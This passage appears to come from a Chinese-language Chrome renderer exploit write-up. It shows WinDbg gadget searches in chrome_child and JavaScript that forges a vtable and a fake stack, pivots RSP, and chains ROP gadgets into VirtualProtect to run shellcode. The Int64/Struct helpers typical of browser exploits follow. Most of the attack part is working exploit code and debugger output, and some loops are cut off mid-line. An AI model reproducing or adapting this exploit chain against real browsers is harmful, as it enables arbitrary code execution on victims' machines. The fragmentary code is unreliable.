    0:016> u 00007ffb`45a8d91a
    chrome_child!cc::SingleKeyframeEffectAnimation::SingleKeyframeEffectAnimation+0x3a [C:\b\c\b\win64_clang\src\cc\animation\single_keyframe_effect_animation.cc @ 44]:
    00007ffb`45a8d91a 5a              pop     rdx
    00007ffb`45a8d91b c3              ret
    0:016> s -w 00007ffb`45960000 L1000000 C35a
    00007ffb`45a8d91a  c35a 4803 c389 8b48 7856 2b48 7056 c148  Z..H..H.VxH+VpH.
    0:016> u 00007ffb`46b16012
    chrome_child!v8::internal::compiler::RawMachineAssembler::TargetParameter+0x2 [C:\b\c\b\win64_clang\src\v8\src\compiler\raw-machine-assembler.cc @ 82]:
    00007ffb`46b16012 4158            pop     r8
    00007ffb`46b16014 c3              ret
    0:016> s -w 00007ffb`45960000 L1000000 5841
    ...
    ...
    00007ffb`46b16012  5841 ccc3 cccc cccc cccc cccc cccc 4856  AX............VH
    0:016> u 00007ffb`472db44c
    chrome_child!DeblockLumaTransposeH2V_sse2+0x1ec:
    00007ffb`472db44c 4159            pop     r9
    00007ffb`472db44e c3              ret
    00007ffb`472db44f 90              nop
    0:016> s -w 00007ffb`45960000 L1000000 5941
    ...
    ...
    00007ffb`472db44c  5941 90c3 5141 4850 ec83 f320 7f0f 2434  AY..AQPH.. ...4$
### 创建一块大的可读写空间，fake vtable和栈伪造，栈劫持和mprotect执行shellcode
    let scratch = new ArrayBuffer(0x100000);
    let scratch_u8 = new Uint8Array(scratch);
    let scratch_u64 = new BigUint64Array(scratch);
    ...
    ...
    let scratch_addr = readPtr(offset, scratch_buffer_addr + new Int64(0x1f).asDouble());
    scratch_u64.fill(gadget, 0, 100);//把其首部当做fake_vtab，在virtual call执行的时候会执行这里面的语句，于是跳转到gadget执行，这个gadget用于栈劫持,此时rcx的值应为el_addr的地址。
    let fake_vtab = scratch_addr;
    ...
    writePtr(offset, el_addr + new Int64(0x10).asDouble(), fake_stack); // RSP
    writePtr(offset, el_addr + new Int64(0x50).asDouble(), pop_rcx_ret + new Int64(0x1).asDouble()); // RIP = ret
    writePtr(offset, el_addr + new Int64(0x58).asDouble(), 0);
    writePtr(offset, el_addr + new Int64(0x60).asDouble(), 0);
    writePtr(offset, el_addr + new Int64(0x68).asDouble(), 0);
    writePtr(offset, el_addr, fake_vtab);
    ...
    ...
    00007ff9`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]
    00007ff9`296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]
    00007ff9`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h] //改变rsp的值为fake_stack
    00007ff9`296f0711 ffe2            jmp     rdx //改变rip到一个ret指令
栈劫持之后，开始执行我们的mprotect gadaget，使shellcode所在的页可执行，然后跳转到shellcode执行
    let fake_stack = scratch_addr + new Int64(0x10000).asDouble();
    let stack = [
        pop_rcx_ret,
        sc_addr,
        pop_rdx_ret,
        new Int64(0x1000).asDouble(),
        pop_r8_ret,
        new Int64(0x40).asDouble(),
        pop_r9_ret,
        scratch_addr,
        virtaulprotect_addr, // VirtualProtect
        sc_addr,
    ];
    for (let i = 0; i 
    String.prototype.padLeft =
    Number.prototype.padLeft = function(total, pad) {
      return (Array(total).join(pad || 0) + this).slice(-total);
    }
    // Return the hexadecimal representation of the given byte array.
    function hexlify(bytes) {
        var res = [];
        for (var i = 0; i  8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }
        return lines.join('\n');
    }
    // Simplified version of the similarly named python module.
    var Struct = (function() {
        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
        var buffer      = new ArrayBuffer(8);
        var byteView    = new Uint8Array(buffer);
        var uint32View  = new Uint32Array(buffer);
        var float64View = new Float64Array(buffer);
        return {
            pack: function(type, value) {
                var view = type;        // See below
                view[0] = value;
                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
            },
            unpack: function(type, bytes) {
                if (bytes.length !== type.BYTES_PER_ELEMENT)
                    throw Error("Invalid bytearray");
                var view = type;        // See below
                byteView.set(bytes);
                return view[0];
            },
            // Available types.
            int8:    byteView,
            int32:   uint32View,
            float64: float64View
        };
    })();
    function Int64(v) {
        // The underlying byte array.
        var bytes = new Uint8Array(8);
        switch (typeof v) {
            case 'number':
                v = '0x' + Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)
                    v = '0' + v;
                var bigEndian = unhexlify(v, 8);
                //console.log(bigEndian.toString());
                bytes.set(Array.from(bigEndian).reverse());
                break;
            case 'object':
                if (v instanceof Int64) {
                    bytes.set(v.bytes());
                } else {
                    if (v.length != 8)
                        throw TypeError("Array must have excactly 8 elements.");
                    bytes.set(v);
                }
                break;
            case 'undefined':
                break;
            default:
                throw TypeError("Int64 constructor requires an argument.");
        }
        // Return a double whith the same underlying bit representation.
        this.asDouble = function() {
            // Check for NaN
            if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
                throw new RangeError("Integer can not be represented by a double");
            return Struct.unpack(Struct.float64, bytes);
        };
        // Return a javascript value with the same underlying bit representation.
        // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
        // due to double conversion constraints.
        this.asJSValue = function() {
            if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
                throw new RangeError("Integer can not be represented by a JSValue");
            // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
            this.assignSub(this, 0x1000000000000);
            var res = Struct.unpack(Struct.float64, bytes);
            this.assignAdd(this, 0x1000000000000);
            return res;
        };
        // Return the underlying bytes of this number as array.
        this.bytes = function() {
            return Array.from(bytes);
        };
        // Return the byte at the given index.
        this.byteAt = function(i) {
            return bytes[i];
        };
        // Return the value of this number as unsigned hex string.
        this.toString = function() {
            //console.log("toString");
            return '0x' + hexlify(Array.from(bytes).reverse());
        };
        // Basic arithmetic.
        // These functions assign the result of the computation to their 'this' object.
        // Decorator for Int64 instance operations. Takes care
        // of converting arguments to Int64 instances if required.
        function operation(f, nargs) {
            return function() {
                if (arguments.length != nargs)
                    throw Error("Not enough arguments for function " + f.name);
                for (var i = 0; i  0xff | 0;
                bytes[i] = cur;
            }
            return this;
        }, 2);
        // this = a - b
        this.assignSub = operation(function sub(a, b) {
            var carry = 0;
            for (var i = 0; i < 8; i++) {
                var cur = a.byteAt(i) - b.byteAt(i) - carry;
                carry = cur < 0 | 0;
                bytes[i] = cur;
            }
            return this;
        }, 2);